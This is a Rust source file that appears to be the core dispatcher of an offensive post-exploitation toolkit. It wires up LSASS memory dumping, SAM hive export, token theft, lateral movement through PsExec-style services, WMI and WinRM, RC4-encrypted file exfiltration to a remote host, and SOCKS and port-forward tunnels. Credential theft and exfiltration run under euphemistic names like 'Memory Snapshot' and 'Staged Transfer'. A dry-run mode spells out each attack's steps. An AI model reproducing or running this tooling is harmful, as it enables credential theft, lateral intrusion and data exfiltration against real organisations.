pub mod creds;
pub mod exfil;
pub mod lateral;
pub mod tunnel;

use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PostExModule {
    LsassDump,
    SamDump,
    TokenTheft,
    PsExec,
    WmiExec,
    WinRmExec,
    Exfil,
    Socks,
    PortForward,
}

impl PostExModule {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Result<Self, String> {
        match s.to_lowercase().as_str() {
            "lsass" | "memdump" | "snapshot" => Ok(Self::LsassDump),
            "sam" | "registry" | "hive" => Ok(Self::SamDump),
            "token" | "delegate" | "session" => Ok(Self::TokenTheft),
            "psexec" | "service" | "svc" => Ok(Self::PsExec),
            "wmi" | "wmic" => Ok(Self::WmiExec),
            "winrm" | "winrs" => Ok(Self::WinRmExec),
            "exfil" | "transfer" | "stage" => Ok(Self::Exfil),
            "socks" | "socks5" | "proxy" => Ok(Self::Socks),
            "portfwd" | "portforward" | "relay" => Ok(Self::PortForward),
            _ => Err(format!("Unknown module: '{}'. Use: lsass, sam, token, psexec, wmi, winrm, exfil, socks, portfwd", s)),
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::LsassDump => "Memory Snapshot",
            Self::SamDump => "Registry Export",
            Self::TokenTheft => "Session Delegation",
            Self::PsExec => "Remote Service",
            Self::WmiExec => "Remote Execution (WMI)",
            Self::WinRmExec => "Remote Execution (WinRM)",
            Self::Exfil => "Staged Transfer",
            Self::Socks => "Proxy Relay",
            Self::PortForward => "Port Relay",
        }
    }

    pub fn all() -> &'static [PostExModule] {
        &[
            Self::LsassDump, Self::SamDump, Self::TokenTheft,
            Self::PsExec, Self::WmiExec, Self::WinRmExec,
            Self::Exfil, Self::Socks, Self::PortForward,
        ]
    }

    pub fn is_credential(&self) -> bool {
        matches!(self, Self::LsassDump | Self::SamDump | Self::TokenTheft)
    }

    pub fn is_lateral(&self) -> bool {
        matches!(self, Self::PsExec | Self::WmiExec | Self::WinRmExec)
    }

    pub fn is_exfil(&self) -> bool {
        matches!(self, Self::Exfil)
    }

    pub fn is_tunnel(&self) -> bool {
        matches!(self, Self::Socks | Self::PortForward)
    }
}

pub struct PostExConfig {
    pub module: PostExModule,
    pub pid: u32,
    pub output: String,
    pub remote: String,
    pub username: String,
    pub password: String,
    pub command: String,
    pub service_name: String,
    pub payload_path: String,
    pub file_path: String,
    pub listen_port: u16,
    pub remote_host: String,
    pub remote_port: u16,
    pub exfil_key: Vec<u8>,
}

pub struct PostExResult {
    pub module: String,
    pub description: String,
}

pub fn dry_run(module: &PostExModule, log: &LogSink) {
    log.info(format!("[DRY RUN] Post-Exploitation: {}", module.name()));
    match module {
        PostExModule::LsassDump => {
            log.step("  Steps:");
            log.detail("    1. Enable debug privilege on current process");
            log.detail("    2. Open target process with full access");
            log.detail("    3. Create output file");
            log.detail("    4. Write memory snapshot via MiniDumpWriteDump");
            log.detail("    5. Close handles");
            log.info("  Requires: elevated privileges, target PID, output path");
        }
        PostExModule::SamDump => {
            log.step("  Steps:");
            log.detail("    1. Enable debug privilege");
            log.detail("    2. Export SAM hive via reg.exe save");
            log.detail("    3. Export SYSTEM hive via reg.exe save");
            log.info("  Requires: elevated privileges, output directory");
        }
        PostExModule::TokenTheft => {
            log.step("  Steps:");
            log.detail("    1. Enable debug privilege");
            log.detail("    2. Open target process token");
            log.detail("    3. Duplicate token with impersonation level");
            log.detail("    4. Assume duplicated identity");
            log.info("  Requires: elevated privileges, target PID");
        }
        PostExModule::PsExec => {
            log.step("  Steps:");
            log.detail("    1. Connect to remote ADMIN$ share");
            log.detail("    2. Copy payload to remote system");
            log.detail("    3. Open remote service manager");
            log.detail("    4. Create and start remote service");
            log.detail("    5. Delete service entry and disconnect");
            log.info("  Requires: remote host, credentials, payload path");
        }
        PostExModule::WmiExec => {
            log.step("  Steps:");
            log.detail("    1. Build WMI command for remote process creation");
            log.detail("    2. Execute via wmic with output capture");
            log.info("  Requires: remote host, command, optional credentials");
        }
        PostExModule::WinRmExec => {
            log.step("  Steps:");
            log.detail("    1. Build WinRM command for remote execution");
            log.detail("    2. Execute via winrs with output capture");
            log.info("  Requires: remote host, command, optional credentials");
        }
        PostExModule::Exfil => {
            log.step("  Steps:");
            log.detail("    1. Open source file and determine size");
            log.detail("    2. Connect to exfil endpoint via TCP");
            log.detail("    3. Read file in 64KB chunks");
            log.detail("    4. RC4-encrypt each chunk (if key provided)");
            log.detail("    5. Send chunk header + encrypted data");
            log.info("  Requires: file path, remote host:port, optional RC4 key");
        }
        PostExModule::Socks => {
            log.step("  Steps:");
            log.detail("    1. Create TCP listener on specified port");
            log.detail("    2. Accept client connection");
            log.detail("    3. SOCKS5 handshake (no auth)");
            log.detail("    4. Parse CONNECT request (IPv4 or domain)");
            log.detail("    5. Connect to target and relay bidirectionally");
            log.info("  Requires: listen port");
        }
        PostExModule::PortForward => {
            log.step("  Steps:");
            log.detail("    1. Create TCP listener on specified port");
            log.detail("    2. Accept client connection");
            log.detail("    3. Connect to configured remote host:port");
            log.detail("    4. Relay data bidirectionally via select");
            log.info("  Requires: listen port, remote host, remote port");
        }
    }
}

pub fn run_postex(config: &PostExConfig, log: &LogSink) -> Result<PostExResult, String> {
    log.info(format!("Post-Exploitation: {}", config.module.name()));

    let result = match config.module {
        PostExModule::LsassDump => {
            if config.pid == 0 { return Err("Target PID required for memory snapshot".into()); }
            if config.output.is_empty() { return Err("Output path required".into()); }
            let r = creds::lsass_dump(config.pid, &config.output, log)?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::SamDump => {
            if config.output.is_empty() { return Err("Output directory required".into()); }
            let r = creds::sam_dump(&config.output, log)?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::TokenTheft => {
            if config.pid == 0 { return Err("Target PID required for session delegation".into()); }
            let r = creds::token_theft(config.pid, log)?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::PsExec => {
            if config.remote.is_empty() { return Err("Remote host required".into()); }
            if config.payload_path.is_empty() { return Err("Payload path required".into()); }
            let svc = if config.service_name.is_empty() { "BadangSvc" } else { &config.service_name };
            let r = lateral::psexec(
                &config.remote, svc, &config.payload_path,
                &config.username, &config.password, log,
            )?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::WmiExec => {
            if config.remote.is_empty() { return Err("Remote host required".into()); }
            if config.command.is_empty() { return Err("Command required".into()); }
            let r = lateral::wmi_exec(
                &config.remote, &config.command,
                &config.username, &config.password, log,
            )?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::WinRmExec => {
            if config.remote.is_empty() { return Err("Remote host required".into()); }
            if config.command.is_empty() { return Err("Command required".into()); }
            let r = lateral::winrm_exec(
                &config.remote, &config.command,
                &config.username, &config.password, log,
            )?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::Exfil => {
            if config.file_path.is_empty() { return Err("File path required for staged transfer".into()); }
            if config.remote_host.is_empty() { return Err("Remote host required".into()); }
            if config.remote_port == 0 { return Err("Remote port required".into()); }
            let exfil_config = exfil::ExfilConfig {
                file_path: config.file_path.clone(),
                host: config.remote_host.clone(),
                port: config.remote_port,
                key: config.exfil_key.clone(),
            };
            let r = exfil::exfil_file(&exfil_config, log)?;
            PostExResult { module: "Staged Transfer".into(), description: format!("Sent {} to {}:{}", r.file_path, config.remote_host, config.remote_port) }
        }
        PostExModule::Socks => {
            if config.listen_port == 0 { return Err("Listen port required".into()); }
            let tunnel_config = tunnel::TunnelConfig {
                mode: tunnel::TunnelMode::Socks5,
                listen_port: config.listen_port,
                remote_host: String::new(),
                remote_port: 0,
            };
            let r = tunnel::start_tunnel(&tunnel_config, log)?;
            PostExResult { module: r.mode.name().into(), description: r.description }
        }
        PostExModule::PortForward => {
            if config.listen_port == 0 { return Err("Listen port required".into()); }
            if config.remote_host.is_empty() { return Err("Remote host required".into()); }
            if config.remote_port == 0 { return Err("Remote port required".into()); }
            let tunnel_config = tunnel::TunnelConfig {
                mode: tunnel::TunnelMode::PortForward,
                listen_port: config.listen_port,
                remote_host: config.remote_host.clone(),
                remote_port: config.remote_port,
            };
            let r = tunnel::start_tunnel(&tunnel_config, log)?;
            PostExResult { module: r.mode.name().into(), description: r.description }
        }
    };

    log.info(format!("  Result: {}", result.description));
    Ok(result)
}

pub fn print_info(log: &LogSink) {
    log.info("Post-Exploitation Modules:");
    log.step("  Credential Harvesting:");
    for m in PostExModule::all().iter().filter(|m| m.is_credential()) {
        log.detail(format!("    {} ({})", m.name(), match m {
            PostExModule::LsassDump => "lsass",
            PostExModule::SamDump => "sam",
            PostExModule::TokenTheft => "token",
            _ => "",
        }));
    }
    log.step("  Lateral Movement:");
    for m in PostExModule::all().iter().filter(|m| m.is_lateral()) {
        log.detail(format!("    {} ({})", m.name(), match m {
            PostExModule::PsExec => "psexec",
            PostExModule::WmiExec => "wmi",
            PostExModule::WinRmExec => "winrm",
            _ => "",
        }));
    }
    log.step("  Data Exfiltration:");
    log.detail("    Staged Transfer (exfil)");
    log.step("  Network Tunneling:");
    log.detail("    Proxy Relay (socks)");
    log.detail("    Port Relay (portfwd)");
}
